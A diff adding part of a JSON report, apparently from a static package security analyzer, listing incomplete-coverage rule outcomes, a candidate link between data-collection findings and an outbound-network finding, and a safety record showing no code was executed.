+            "condition": "RELATED_RESTORATION_INCOMPLETE",
+            "status": "NOT_SATISFIED",
+            "detail": "Exact path/provenance match has unresolved or limited restoration"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "I05",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "BUDGET_EXCEEDED_WITH_RELEVANT_UNRESOLVED_TARGET",
+            "status": "NOT_SATISFIED",
+            "detail": "Restore budget was exceeded for a relevant unresolved target"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "I06",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "DERIVED_PROVENANCE_INCOMPLETE",
+            "status": "NOT_SATISFIED",
+            "detail": "Relevant derived Finding cannot be mapped to a restored original file"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "I07",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "RECORDED_SCAN_COVERAGE_GAP",
+            "status": "NOT_SATISFIED",
+            "detail": "No scan coverage-gap field exists in AgentPlanningInputV0_1; counts are not used to infer one"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "I08",
+        "category": "INCOMPLETE",
+        "outcome": "UNVERIFIED",
+        "conditions": [
+          {
+            "condition": "SCAN_COVERAGE_UNKNOWN",
+            "status": "SATISFIED",
+            "detail": "AgentPlanningInputV0_1 has no complete coverage record, including Custom Rule P0 omissions"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": [
+          "SCAN_COVERAGE_UNKNOWN"
+        ]
+      },
+      {
+        "ruleId": "I09",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HANDOFF_EVIDENCE_GAP",
+            "status": "NOT_SATISFIED",
+            "detail": "No proven Adapter transfer loss is present; relation reference mismatch is not transfer loss"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      }
+    ]
+  },
+  "relationIntegrity": [
+    {
+      "analyzer": "custom-rule",
+      "relationId": "custom-relation:84e664cc3dd75ac1",
+      "sourceFindingIds": [
+        "custom-rule:custom.collection-source:0",
+        "custom-rule:custom.collection-source:1",
+        "custom-rule:custom.collection-source:2",
+        "custom-rule:custom.collection-source:3"
+      ],
+      "sinkFindingIds": [
+        "custom-rule:custom.network-outbound:5"
+      ],
+      "allFindingRefsPresent": true,
+      "missingFindingIds": [],
+      "semanticLinkProvenByCandidate": false,
+      "note": "CANDIDATE status and referential integrity do not prove data/execution/call linkage."
+    }
+  ],
+  "safety": {
+    "llmCalls": 0,
+    "packageExecutions": 0,
+    "lifecycleExecutions": 0,
+    "sourceTreeDigestBefore": "c767be6811e0208b05c8fb4fd35a62b70b3aa4b795ac0e794576de6b549e592c",
+    "sourceTreeDigestAfter": "c767be6811e0208b05c8fb4fd35a62b70b3aa4b795ac0e794576de6b549e592c"
+  },
+  "durationMs": 1676
+}
